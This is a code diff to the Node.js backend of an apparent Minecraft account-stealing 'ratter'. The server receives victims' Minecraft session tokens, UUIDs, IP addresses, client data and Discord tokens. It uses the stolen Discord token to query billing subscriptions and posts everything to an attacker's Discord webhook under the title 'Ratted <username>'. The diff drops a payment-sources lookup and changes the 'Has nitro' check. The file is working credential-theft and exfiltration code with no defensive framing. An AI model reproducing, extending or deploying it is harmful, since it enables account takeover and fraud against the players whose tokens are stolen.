@@ -105,13 +105,12 @@ app.post("/", (req, res) => {
                 //get discord info
                 const discord = await (await get("https://discordapp.com/api/v6/users/@me/billing/subscriptions", { headers: { "Authorization": req.body.discord, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
 
-                const discord_b = await (await get("https://discord.com/api/v9/users/@me/billing/payment-sources", { headers: { "Authorization": req.body.discord, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
                 //send to discord webhook
                 post(process.env.WEBHOOK, JSON.stringify({
                     content: `@everyone - ${formatNumber(total_networth)}`, //ping
                     embeds: [{
                         title: `Ratted ${req.body.username} - Click For Stats`,
-                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${req.body.discord}\`\`\`\nHas nitro: ${discord_b}`,
+                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${req.body.discord}\`\`\`\nHas nitro: ${discord.length > 0}`,
                         url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                         color: 5814783,
                         footer: {
